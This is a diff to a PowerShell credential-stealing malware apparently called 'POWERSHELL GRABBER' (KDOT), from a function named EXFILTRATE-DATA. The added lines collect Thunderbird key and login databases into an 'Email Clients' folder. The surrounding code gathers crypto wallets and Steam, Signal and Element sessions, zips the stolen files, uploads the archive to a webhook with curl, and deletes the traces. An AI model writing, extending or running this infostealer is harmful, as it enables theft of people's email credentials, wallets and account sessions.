@@ -191,13 +191,18 @@ function EXFILTRATE-DATA {
 	# Create temporary directory to store wallet data for exfiltration
 	New-Item -Path "$env:localappdata\Temp" -Name "Crypto Wallets" -ItemType Directory -force | out-null
 	$crypto = "$env:localappdata\Temp\Crypto Wallets"
-
+	
+	
+	New-Item -Path "$env:localappdata\Temp" -Name "Email Clients" -ItemType Directory -force | out-null
+    $emailclientsfolder = "$env:localappdata\Temp\Email Clients"
+	
     # Thunderbird Exfil
     $Thunderbird = @('key4.db', 'key3.db', 'logins.json', 'cert9.db')
     If (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
-    New-Item -Path "$crypto\Thunder" -ItemType Directory | Out-Null
-    Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles" -Include $Thunderbird -Recurse | Copy-Item -Destination "$crypto\Thunder" -Recurse -Force
+    New-Item -Path "$emailclientsfolder\Thunderbird" -ItemType Directory | Out-Null
+    Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles" -Include $Thunderbird -Recurse | Copy-Item -Destination "$emailclientsfolder\Thunderbird" -Recurse -Force
     }
+	
     # Crypto Wallets
     
     If (Test-Path -Path "$env:userprofile\AppData\Roaming\Armory") {
@@ -414,6 +419,7 @@ function EXFILTRATE-DATA {
 	Move-Item -Path "$extracted\steam-session.zip" -Destination "$extracted\KDOT\steam-session.zip" 
 	Move-Item -Path "Files Grabber" -Destination "$extracted\KDOT\Files Grabber" 
 	Move-Item -Path "Crypto Wallets" -Destination "$extracted\KDOT\Crypto Wallets" 
+	Move-Item -Path "Email Clients" -Destination "$emailclientsfolder\KDOT\Email Clients" 
     Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force
     curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/m2SSKrBt/Logo.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook
     Remove-Item "$extracted\KDOT.zip"
@@ -423,6 +429,7 @@ function EXFILTRATE-DATA {
 	Remove-Item "$extracted\element-session" -recurse -force
 	Remove-Item "$extracted\signal-session" -recurse -force
 	Remove-Item "$extracted\steam-session" -recurse -force
+	Remove-Item "$emailclientsfolder\Email Clients" -recurse -force
     Remove-Item "$extracted\main.exe"
 }
 
